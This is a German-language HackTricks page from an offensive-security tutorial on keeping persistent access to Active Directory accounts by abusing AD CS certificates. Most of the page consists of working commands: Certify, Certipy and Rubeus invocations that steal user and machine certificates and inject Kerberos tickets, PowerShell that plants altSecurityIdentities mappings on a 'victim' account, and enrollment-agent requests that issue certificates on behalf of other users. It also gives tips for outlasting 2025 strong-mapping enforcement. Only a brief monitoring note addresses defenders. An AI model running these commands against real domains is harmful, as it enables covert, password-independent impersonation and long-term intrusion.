# AD CS Konten-Persistenz

{{#include ../../../banners/hacktricks-training.md}}

**Dies ist eine kurze Zusammenfassung der Kapitel zur Konten-Persistenz aus der großartigen Forschung von [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)**

## Verständnis des Diebstahls von Active-User-Anmeldeinformationen mit Zertifikaten – PERSIST1

In einem Szenario, in dem ein Zertifikat, das die Domain-Authentifizierung ermöglicht, von einem Benutzer angefordert werden kann, hat ein Angreifer die Möglichkeit, dieses Zertifikat anzufordern und zu stehlen, um Persistenz im Netzwerk aufrechtzuerhalten. Standardmäßig erlaubt die `User`-Vorlage in Active Directory solche Anfragen, obwohl sie manchmal deaktiviert sein kann.

Mit [Certify](https://github.com/GhostPack/Certify) oder [Certipy](https://github.com/ly4k/Certipy) können Sie nach aktivierten Vorlagen suchen, die Client-Authentifizierung erlauben, und dann eine anfordern:
```bash
# Enumerate client-auth capable templates
Certify.exe find /clientauth

# Request a user cert from an Enterprise CA (current user context)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User

# Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
```
Die Stärke eines Zertifikats liegt in seiner Fähigkeit, sich als der Benutzer zu authentifizieren, dem es gehört, unabhängig von Passwortänderungen, solange das Zertifikat gültig bleibt.

Sie können PEM in PFX konvertieren und es verwenden, um ein TGT zu erhalten:
```bash
# Convert PEM returned by Certify to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Use certificate for PKINIT and inject the TGT
Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /ptt

# Or with Certipy
certipy auth -pfx user.pfx -dc-ip 10.0.0.10
```
> Hinweis: In Kombination mit anderen Techniken (siehe THEFT-Abschnitte) ermöglicht certificate-based auth dauerhaften Zugriff, ohne LSASS zu berühren, und sogar aus non-elevated contexts.

## Erlangen von Host-Persistenz mit Zertifikaten - PERSIST2

Wenn ein Angreifer erhöhte Rechte auf einem Host hat, kann er das Machine-Konto des kompromittierten Systems für ein Zertifikat mit dem Standard-`Machine`-Template registrieren. Die Authentifizierung als Maschine aktiviert S4U2Self für lokale Dienste und kann dauerhafte Persistenz auf dem Host bieten:
```bash
# Request a machine certificate as SYSTEM
Certify.exe request /ca:dc.theshire.local/theshire-DC-CA /template:Machine /machine

# Authenticate as the machine using the issued PFX
Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
```
## Erweiterung der Persistenz durch Zertifikatserneuerung - PERSIST3

Das Ausnutzen der Gültigkeits- und Erneuerungszeiträume von Zertifikatvorlagen ermöglicht es einem Angreifer, langfristigen Zugriff aufrechtzuerhalten. Wenn Sie im Besitz eines zuvor ausgestellten Zertifikats und dessen privatem Schlüssel sind, können Sie es vor dem Ablauf erneuern, um frische, langlebige Zugangsdaten zu erhalten, ohne zusätzliche Anfrageartefakte zu hinterlassen, die mit dem ursprünglichen Principal verknüpft sind.
```bash
# Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
# Provide the existing PFX and target the same CA/template when possible
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -pfx user_old.pfx -renew -out user_renewed.pfx

# Native Windows renewal with certreq
# (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
```
> Operativer Tipp: Verfolge die Laufzeiten von attacker-held PFX files und erneuere frühzeitig. Eine Erneuerung kann außerdem dazu führen, dass aktualisierte Zertifikate die moderne SID-Mapping-Erweiterung enthalten, wodurch sie unter strengeren DC-Mapping-Regeln weiterhin nutzbar bleiben (siehe nächsten Abschnitt).

## Explizite Zertifikatszuordnungen setzen (altSecurityIdentities) – PERSIST4

Wenn du in das `altSecurityIdentities`-Attribut eines Zielkontos schreiben kannst, kannst du ein attacker-controlled certificate explizit diesem Konto zuordnen. Das bleibt über Passwortänderungen hinweg bestehen und bleibt bei Verwendung starker Mapping-Formate auch unter moderner DC-Durchsetzung funktionsfähig.

Grober Ablauf:

1. Beschaffe oder stelle ein client-auth-Zertifikat aus, das du kontrollierst (z. B. das `User`-Template für dich selbst registrieren).
2. Extrahiere einen starken Identifier aus dem Zertifikat (Issuer+Serial, SKI oder SHA1-PublicKey).
3. Füge auf dem victim principal im `altSecurityIdentities`-Attribut eine explizite Zuordnung hinzu, die diesen Identifier verwendet.
4. Authentifiziere dich mit deinem Zertifikat; der DC ordnet es über das explizite Mapping dem victim zu.

Beispiel (PowerShell) mit einer starken Issuer+Serial-Zuordnung:
```powershell
# Example values - reverse the issuer DN and serial as required by AD mapping format
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SerialR = '1200000000AC11000000002B' # reversed byte order of the serial
$Map     = "X509:<I>$Issuer<SR>$SerialR"

# Add mapping to victim. Requires rights to write altSecurityIdentities on the object
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Authentifizieren Sie sich dann mit Ihrem PFX. Certipy wird direkt ein TGT erhalten:
```bash
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10

# If PKINIT is unavailable on the DC, reuse the same persisted cert via Schannel/LDAPS
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell
```
### Aufbau starker `altSecurityIdentities` Mappings

In der Praxis sind **Issuer+Serial**- und **SKI**-Mappings die einfachsten starken Formate, die sich aus einem in Angreiferbesitz befindlichen Zertifikat erstellen lassen. Das ist ab dem 11. Februar 2025 wichtig, wenn DCs standardmäßig auf **Full Enforcement** umstellen und schwache Mappings nicht mehr zuverlässig sind.
```bash
# Extract issuer, serial and SKI from a cert/PFX
openssl pkcs12 -in attacker_user.pfx -clcerts -nokeys -out attacker_user.crt
openssl x509 -in attacker_user.crt -noout -issuer -serial -ext subjectKeyIdentifier
```

```powershell
# Example strong SKI mapping for a user or computer object
$Map = 'X509:<SKI>9C4D7E8A1B2C3D4E5F60718293A4B5C6D7E8F901'
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
# Set-ADComputer -Identity 'WS01$' -Add @{altSecurityIdentities=$Map}
```
Hinweise
- Verwende nur starke Mapping-Typen: `X509IssuerSerialNumber`, `X509SKI`, oder `X509SHA1PublicKey`. Schwache Formate (Subject/Issuer, Subject-only, RFC822 email) sind veraltet und können durch DC-Richtlinien blockiert werden.
- Das Mapping funktioniert sowohl für **user**- als auch **computer**-Objekte, daher reicht Schreibzugriff auf `altSecurityIdentities` eines Computerkontos aus, um als diese Maschine Persistenz zu erreichen.
- Die Zertifikatkette muss bis zu einer vom DC vertrauten Root aufgebaut werden. Enterprise CAs in NTAuth werden typischerweise vertraut; einige Umgebungen vertrauen außerdem öffentlichen CAs.
- Schannel-Authentifizierung bleibt für Persistenz nützlich, selbst wenn PKINIT fehlschlägt, weil der DC das Smart Card Logon EKU nicht besitzt oder `KDC_ERR_PADATA_TYPE_NOSUPP` zurückgibt.

Mehr zu schwachen expliziten Mappings und Angriffswegen siehe:


{{#ref}}
domain-escalation.md
{{#endref}}

## Enrollment Agent als Persistenz – PERSIST5

Wenn du ein gültiges Certificate Request Agent/Enrollment Agent certificate erhältst, kannst du beliebig neue anmeldefähige Zertifikate im Namen von Benutzern ausstellen und das Agent-PFX offline als Persistenz-Token aufbewahren. Missbrauchsablauf:
```bash
# Request an Enrollment Agent cert (requires template rights)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"

# Mint a user cert on behalf of another principal using the agent PFX
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
/onbehalfof:CORP\\victim /enrollcert:C:\Temp\agent.pfx /enrollcertpw:AgentPfxPass

# Or with Certipy
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
```
Der Widerruf des Agent-Zertifikats oder der Template-Berechtigungen ist erforderlich, um diese Persistenz zu beseitigen.

Betriebliche Hinweise
- Moderne `Certipy`-Versionen unterstützen sowohl `-on-behalf-of` als auch `-renew`, sodass ein Angreifer, der eine Enrollment Agent PFX besitzt, Leaf-Zertifikate ausstellen und später erneuern kann, ohne das ursprüngliche Zielkonto erneut zu berühren.
- Wenn die TGT-Beschaffung basierend auf PKINIT nicht möglich ist, kann das resultierende on-behalf-of-Zertifikat dennoch für Schannel-Authentifizierung mit `certipy auth -pfx victim_onbo.pfx -dc-ip 10.0.0.10 -ldap-shell` verwendet werden.

## 2025 Strong Certificate Mapping Enforcement: Auswirkungen auf Persistenz

Microsoft KB5014754 hat Strong Certificate Mapping Enforcement auf Domain Controllern eingeführt. Seit dem 11. Februar 2025 sind DCs standardmäßig auf Full Enforcement eingestellt und lehnen schwache/mehrdeutige Zuordnungen ab. Praktische Auswirkungen:

- Zertifikate von vor 2022, denen die SID-Mapping-Erweiterung fehlt, können bei DCs mit Full Enforcement an impliziter Zuordnung scheitern. Angreifer können den Zugriff aufrechterhalten, indem sie Zertifikate über AD CS erneuern (um die SID-Erweiterung zu erhalten) oder indem sie eine starke explizite Zuordnung in `altSecurityIdentities` (PERSIST4) setzen.
- Explizite Zuordnungen mit starken Formaten (Issuer+Serial, SKI, SHA1-PublicKey) funktionieren weiterhin. Schwache Formate (Issuer/Subject, nur Subject, RFC822) können blockiert werden und sollten für Persistenz vermieden werden.

Administratoren sollten überwachen und Alarme einrichten für:
- Änderungen an `altSecurityIdentities` sowie Ausstellung/Erneuerungen von Enrollment Agent- und Benutzerzertifikaten.
- CA-Ausstellungsprotokolle auf on-behalf-of-Anfragen und ungewöhnliche Erneuerungsmuster.

## Referenzen

- Microsoft. KB5014754: Änderungen der zertifikatbasierten Authentifizierung auf Windows-Domaincontrollern (Durchsetzungszeitplan und starke Zuordnungen).
https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
- SpecterOps. ADCS ESC14 Abuse Technique (expliziter Missbrauch von `altSecurityIdentities` an Benutzer-/Computerobjekten).
https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/
- Certipy Wiki – Befehlsreferenz (`req -renew`, `auth`, `shadow`).
https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference
- Almond Offensive Security. Authentifizierung mit Zertifikaten, wenn PKINIT nicht unterstützt wird.
https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html

{{#include ../../../banners/hacktricks-training.md}}
